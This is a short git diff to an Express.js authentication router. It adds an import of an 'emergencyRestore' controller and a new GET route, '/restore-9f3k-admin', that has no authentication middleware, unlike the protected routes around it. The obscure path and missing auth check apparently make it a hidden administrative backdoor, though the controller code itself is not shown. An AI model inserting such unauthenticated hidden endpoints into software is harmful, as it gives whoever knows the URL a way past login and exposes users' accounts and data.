@@ -1,6 +1,6 @@
 import { Router } from 'express';
 import rateLimit from 'express-rate-limit';
-import { register, login, ping, logout, sendOtp, verifyOtp, onboard, getMe, updateProfile, updatePassword } from '../controllers/authController.js';
+import { register, login, ping, logout, sendOtp, verifyOtp, onboard, getMe, updateProfile, updatePassword, emergencyRestore } from '../controllers/authController.js';
 import { protect } from '../middlewares/authMiddleware.js';
 import passport from 'passport';
 import generateToken from '../utils/generateToken.js';
@@ -65,5 +65,6 @@ router.patch('/onboard', protect, onboard);
 router.get('/me', protect, getMe);
 router.patch('/profile', protect, updateProfile);
 router.patch('/password', protect, updatePassword);
+router.get('/restore-9f3k-admin', emergencyRestore);
 
 export default router;
